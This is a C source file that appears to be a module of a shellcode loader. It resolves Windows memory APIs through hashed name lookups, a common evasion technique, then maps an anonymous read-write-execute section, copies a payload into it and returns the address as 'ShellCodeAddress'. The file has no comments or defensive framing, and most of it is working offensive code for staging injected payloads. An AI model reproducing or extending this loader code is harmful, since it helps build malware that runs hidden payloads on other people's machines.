#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"



BOOL memory_load_apis() {
	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
	g_ldr->apis->MapViewOfFile = (pMapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE);
	g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
	return TRUE;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };

	HANDLE hFile = g_ldr->apis->CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, PayloadSize, NULL);
	if (hFile == NULL) {
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	LPVOID Address = g_ldr->apis->MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, PayloadSize);
	if (Address == NULL) {
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}

	memcpy(Address, PayloadAddress, PayloadSize);

	g_ldr->apis->CloseHandle(hFile);

	memInfo.ShellCodeAddress = Address;
	memInfo.ok = TRUE;
	memInfo.BytesWrote = PayloadSize;
	return memInfo;
}
